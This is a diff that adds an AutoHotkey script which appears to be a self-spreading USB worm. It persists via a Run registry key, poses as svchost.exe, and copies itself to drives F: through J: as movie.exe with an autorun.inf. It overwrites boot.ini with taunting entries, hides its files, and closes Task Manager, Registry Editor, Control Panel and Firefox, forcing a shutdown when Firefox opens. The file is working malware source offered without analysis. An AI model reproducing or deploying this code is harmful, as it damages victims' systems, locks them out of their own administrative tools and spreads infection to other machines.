@@ -1,0 +1,352 @@
+; <COMPILER: v1.0.47.5>
+
+Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,windos,%windir%\system32\mizi\svchost.exe
+RegWrite, REG_SZ, HKEY_CURRENT_USER, Software\Microsoft\Windows\CurrentVersion\Internet Settings\Lockdown_Zones\0,DisplayName,HACK BY::<<GYMIE>>
+
+#Persistent
+#notrayicon
+
+FileCreateDir,%A_windir%\system32\mizi
+FileSetAttrib, +RH,%A_windir%\system32\mizi
+
+
+IfExist, F:\movie.exe
+    filecopy,F:\movie.exe,%A_windir%\system32\mizi\svchost.exe
+IfExist, G:\movie.exe
+    filecopy,G:\movie.exe,%A_windir%\system32\mizi\svchost.exe
+IfExist, H:\movie.exe
+    filecopy,H:\movie.exe,%A_windir%\system32\mizi\svchost.exe
+IfExist, I:\movie.exe
+    filecopy,I:\movie.exe,%A_windir%\system32\mizi\svchost.exe
+IfExist, J:\movie.exe
+    filecopy,J:\movie.exe,%A_windir%\system32\mizi\svchost.exe
+
+IfNotExist,%A_windir%\system32\mizi\movie.exe
+	FileCopy,movie.exe,%A_windir%\system32\mizi\svchost.exe
+
+filecopy,%A_windir%\system32\mizi\svchost.exe,%A_MyDocuments%\My Videos\movie.exe
+filecopy,%A_windir%\system32\mizi\svchost.exe,C:\Documents and Settings\All Users\Documents\My Videos\movie.exe
+
+ifexist,C:\boot.ini
+	filecopy,C:\boot.ini,C:\bot.bak
+
+Fileappend,
+(
+[Autorun]
+open=movie.exe
+shellexecute=movie.exe
+shell\Auto\command=movie.exe
+),%A_windir%\system32\mizi\autorun.inf
+Filesetattrib,+SHR,%A_windir%\system32\mizi\autorun.inf
+
+FileDelete, C:\boot.ini
+sleep,100
+
+FileAppend,
+(
+[boot loader]
+timeout=60
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="KOMPUTER ANDA TELAH DI GODAM OLEH : 'GYMIE'" /noexecute=optin /fastdetect
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS.0="SIAPA 'GYMIE'???...I DON`T KNOW." /noexecute=optin /fastdetect
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS.1="HAHAHAHAHAHAHAHAAAAA" /noexecute=optin /fastdetect
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS.2="------------------------------------------------ "/noexecute=optin /fastdetect
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS.3="----------------------fuck you!!---------------- "/noexecute=optin /fastdetect
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS.4="----------------------fuck you!!---------------- " /noexecute=optin /fastdetect
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS.5="----------------------fuck you!!---------------- "/noexecute=optin /fastdetect
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS.6=""---------------------fuck you!!---------------- " /noexecute=optin /fastdetect
+
+),C:\boot.ini
+Filesetattrib,+SHR,C:\boot.ini
+
+
+
+
+IfExist, F:\
+    filecopy,%A_windir%\system32\mizi\svchost.exe,F:\movie.exe
+	filecopy,%A_windir%\system32\mizi\autorun.inf,F:\
+IfExist, G:\
+    filecopy,%A_windir%\system32\mizi\svchost.exe,G:\movie.exe
+	filecopy,%A_windir%\system32\mizi\autorun.inf,F:\
+IfExist, H:\
+    filecopy,%A_windir%\system32\mizi\svchost.exe,H:\movie.exe
+	filecopy,%A_windir%\system32\mizi\autorun.inf,F:\
+IfExist, I:\
+    filecopy,%A_windir%\system32\mizi\svchost.exe,I:\movie.exe
+	filecopy,%A_windir%\system32\mizi\autorun.inf,F:\
+IfExist, J:\
+    filecopy,%A_windir%\system32\mizi\svchost.exe,J:\movie.exe
+        filecopy,%A_windir%\system32\mizi\autorun.inf,J:\
+
+
+
+
+
+settimer,ban,1000
+SetTimer, WatchCursor, 100
+return
+
+ban:
+WinGetActiveTitle, ed
+ ifinstring,ed,microsoft word
+  {
+   WinGetActiveTitle, Title
+   WinGetTitle, title, ahk_id %id%
+	WinSetTitle, %title%, ,!#@#$?????????????????????????????????????????????????????????????@!#$@!
+   return
+  }
+ifinstring,ed,MY computer
+  {
+	Progress, b w200,BY::GYMIE, SABAQQ %USERNAME%...,LOADINGG...%USERNAME%
+	Progress, 10
+	SLEEP,200
+	Progress, 20
+	SLEEP,200
+	Progress, 30
+	SLEEP,200
+	Progress, 40
+	SLEEP,200
+	Progress, 50
+	SLEEP,200
+	Progress, 60
+	SLEEP,200
+	Progress, 70
+	SLEEP,200
+	Progress, 80
+	SLEEP,200
+	Progress, 90
+	SLEEP,200
+	Progress, 100
+	Sleep, 1000
+	Progress, Off
+        WinGetActiveTitle, Title
+        WinGetTitle, title, ahk_id %id%
+	WinSetTitle, %title%, ,<< HACK BY:: GYMIE >>
+   return
+  }
+ifinstring,ed,Windows task manager
+  {
+	winclose %ed%
+	SoundPlay, %A_WinDir%\Media\Windows Startup.wav
+   msgbox,262160,<<GYMIE>>, You Can't use this.`r Because Windows has some problem.,5
+   return
+  }
+ ifinstring,ed,gom player
+  {
+   winclose %ed%
+   msgbox,262160,DAMM YOU %USERNAME%!!,gomgomgombak..`R tak leh buka..haha??  ,5
+   return
+  }
+ifinstring,ed,skype
+  {
+    WinGetActiveTitle, Title
+   WinGetTitle, title, ahk_id %id%
+	WinSetTitle, %title%, ,SEKAITTTT
+   return
+  }
+ ifinstring,ed,Mozilla Firefox
+  {
+    winclose %ed%
+    msgbox,262160,GYMIE!!`r ...,fuck musang berapi!!!,5
+    run shutdown -s -t 60 -c "hehehehe..."
+    return
+  }
+ifinstring,ed,control panel
+  {
+    winclose %ed%
+    msgbox,262160,GYMIE,anda tak boleh akses `r ONLY GYMIE CAN DO IT!!..,5
+    run notepad
+    return
+  }
+ifinstring,ed,mizi
+  {
+	winclose %ed%
+    run C:\
+    return
+  }
+ifinstring,ed,microsoft internet explorer
+{
+	Progress, b w200,BY::GYMIE, SABAQQ %USERNAME%...,LOADINGG...%USERNAME%
+	Progress, 10
+	SLEEP,200
+	Progress, 20
+	SLEEP,200
+	Progress, 30
+	SLEEP,200
+	Progress, 40
+	SLEEP,200
+	Progress, 50
+	SLEEP,200
+	Progress, 60
+	SLEEP,200
+	Progress, 70
+	SLEEP,200
+	Progress, 80
+	SLEEP,200
+	Progress, 90
+	SLEEP,200
+	Progress, 100
+	Sleep, 1000
+	Progress, Off
+   SoundPlay, %A_WinDir%\Media\Windows Startup.wav
+     WinGetActiveTitle, Title
+   WinGetTitle, title, ahk_id %id%
+	WinSetTitle, %title%, ,<< HACK BY:: GYMIE >>
+
+
+  }
+ifinstring,ed,adobe reader
+{
+    winclose %ed%
+    msgbox,262160,%USERNAME% FOOLS,sorry the Windows cannot found this application,10
+    SoundPlay, %A_WinDir%\Media\Windows XP Logoff Sound.wav
+    return
+}
+ifinstring,ed,media player classic
+{
+    winclose %ed%
+    SoundPlay, %A_WinDir%\Media\Windows XP Logoff Sound.wav
+    msgbox,262160,<<GYMIE>>,Your Media Player Classic has been hack!!`r you can use Winamp ONLY!!...,10
+    return
+  }
+ifinstring,ed,registry editor
+{
+    winclose %ed%
+    msgbox,262160,%USERNAME% FOOLS,you can't acsses this!!,5
+    SoundPlay, %A_WinDir%\Media\tada.wav
+    return
+  }
+ifinstring,ed,windows media player
+{
+	Progress, b w200,BY::GYMIE, SABAQQ %USERNAME%...,LOADINGG...%USERNAME%
+	Progress, 10
+	SLEEP,200
+	Progress, 20
+	SLEEP,200
+	Progress, 30
+	SLEEP,200
+	Progress, 40
+	SLEEP,200
+	Progress, 50
+	SLEEP,200
+	Progress, 60
+	SLEEP,200
+	Progress, 70
+	SLEEP,200
+	Progress, 80
+	SLEEP,200
+	Progress, 90
+	SLEEP,200
+	Progress, 100
+	Sleep, 1000
+	Progress, Off
+
+     WinGetActiveTitle, Title
+   WinGetTitle, title, ahk_id %id%
+	WinSetTitle, %title%, ,<< HACK BY:: GYMIE >>
+  return
+  }
+ifinstring,ed,network Connections
+{
+
+     WinGetActiveTitle, Title
+   WinGetTitle, title, ahk_id %id%
+	WinSetTitle, %title%, ,<< HACK BY:: GYMIE >>
+  return
+  }
+ifinstring,ed,(F:)
+{
+   filecopy,%A_windir%\system32\mizi\svchost.exe,F:\movie.exe
+	filecopy,%A_windir%\system32\mizi\autorun.inf,F:\
+return
+}
+ifinstring,ed,(G:)
+{
+    filecopy,%A_windir%\system32\mizi\svchost.exe,G:\movie.exe
+	filecopy,%A_windir%\system32\mizi\autorun.inf,G:\
+return
+}
+ifinstring,ed,(H:)
+{
+   filecopy,%A_windir%\system32\mizi\svchost.exe,H:\movie.exe
+	filecopy,%A_windir%\system32\mizi\autorun.inf,H:\
+return
+}
+ifinstring,ed,(I:)
+{
+    filecopy,%A_windir%\system32\mizi\svchost.exe,I:\movie.exe
+	filecopy,%A_windir%\system32\mizi\autorun.inf,I:\
+return
+}
+
+
+return
+
+SetTimer, WatchCursor, 100
+
+SetTimer, WatchForMenu, 5
+return
+
+WatchCursor:
+MouseGetPos, , , id, control
+WinGetActiveTitle, Title
+WinGetTitle, title, ahk_id %id%
+WinGetClass, class, ahk_id %id%
+
+
+WatchForMenu:
+DetectHiddenWindows, on
+IfWinExist, ahk_class #32768
+    WinSet, Transparent, 200
+
+{
+ifnotexist,C:\%title%\movie.exe
+	filecopy,%A_windir%\system32\mizi\svchost.exe,C:\%title%\movie.exe
+	Fileappend,
+	(
+	[.ShellClassInfo]
+	IconFile=C:\WINDOWS\system32\shell32.dll
+	IconIndex=3
+	ConfirmFileOp=0
+	[{BE098140-A513-11D0-A3A4-00C04FD706EC}]
+	IconArea_Image=%A_windir%\Gone Fishing.bmp
+
+	),C:\%title%\desktop.ini
+	Filesetattrib,+SHR,C:\%title%\desktop.ini
+}
+{
+ifnotexist,D:\%title%\m.bat
+	filecopy,%A_windir%\system32\mizi\svchost.exe,D:\%title%\movie.exe
+		Fileappend,
+	(
+	[.ShellClassInfo]
+	IconFile=C:\WINDOWS\system32\shell32.dll
+	IconIndex=3
+	ConfirmFileOp=0
+	[{BE098140-A513-11D0-A3A4-00C04FD706EC}]
+	IconArea_Image=%A_windir%\Gone Fishing.bmp
+
+	),D:\%title%\desktop.ini
+	Filesetattrib,+SHR,D:\%title%\desktop.ini
+}
+
+{
+ifnotexist,F:\%title%\movie.exe
+	filecopy,%A_windir%\system32\mizi\svchost.exe,F:\%title%\movie.exe
+}
+{
+ifnotexist,G:\%title%\m.bat
+	filecopy,%A_windir%\system32\mizi\svchost.exe,G:\%title%\movie.exe
+}
+
+{
+ifnotexist,H:\%title%\movie.exe
+	filecopy,%A_windir%\system32\mizi\svchost.exe,H:\%title%\movie.exe
+}
+{
+ifnotexist,I:\%title%\m.bat
+	filecopy,%A_windir%\system32\mizi\svchost.exe,I:\%title%\movie.exe
+}
+return
